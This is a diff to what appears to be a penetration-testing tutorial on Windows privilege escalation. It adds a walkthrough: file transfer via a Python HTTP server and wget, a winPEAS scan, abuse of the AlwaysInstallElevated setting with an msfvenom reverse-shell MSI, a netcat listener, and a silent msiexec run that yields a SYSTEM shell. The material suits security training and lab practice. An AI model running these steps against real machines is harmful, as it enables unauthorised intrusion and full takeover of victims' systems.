@@ -34,8 +34,40 @@ Other options are to transfer these files via SMB or NetCat if it is available o
 When transfering via SMB you have to setup SMB on kali.
 
 To start a http server run the following command.
-<div class="alert-info"> python3 -m http.server 80</div>
+<div class="alert-info">sudo python3 -m http.server 80</div>
 This will start a http on port 80 in the directory you currently are.
 
 You can now download the lse.sh if you are on Linux or winPEAS.exe if you are on Windows.
 Once you have transferd one of the files you can run it and read the output carefully for anything interesting that could lead to a privilege escalation.
+
+Let's say we already have shell on a Windows victim we could start from there to download the winPEAS.exe file.
+<div class="alert-info">wget http://ip/winPEAS.exe -O winPEAS.exe</div>
+![image](/assets/img/transfer-winpeas.png)
+As you can see the shell we had does not understand weget. So we just type in powershell to get a powershell shell were we can run the wget comman.
+
+Next run the winPEAS.exe and check for anything interesting that could lead to a privilege escalation.
+We use the command .\winPEAS.exe -h to see what options we have.
+![image](/assets/img/winpeas-h.png)
+Let's run the following command
+<div class="alert-info">.\winPEAS.exe windowscreds</div>
+![image](/assets/img/winpeas-windowscreds.png)
+The results shows us that AlwaysInstallElevated is set to 1 in both HKLM and HKCU!
+This means that .MSI packages are installed with eleveated system privileges.
+We now can run the following msfvenom commannd to create a payload with a reverse shell in it.
+<div class="alert-info">msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi</div>
+![image](/assets/img/msfvenom-msi.png)
+Next we set up a http server to download the file from the victim
+<div class="alert-info">sudo python3 -m http.server 80</div>
+![image](/assets/img/http-server.png)
+Next we download the reverse.msi to the victim
+<div class="alert-info">wget http://ip/reverse.msi -O reverse.msi</div>
+![image](/assets/img/wget-msi.png)
+We now setup a new NetCat listener on Kali 
+<div class="alert-info">sudo nc -nlvp 55</div>
+![image](/assets/img/nc-listener-55.png)
+Finally we run the following command in the victim shell
+<div class="alert-info">msiexec /quiet /qn /i reverse.msi</div>
+![image](/assets/img/msiexec.png)
+Lets go back to the new nc listener and checkout if we did catch the reverse shell with system privileges.
+![image](/assets/img/system-msiexec.png)
+Yes, we have shell and running it as system!
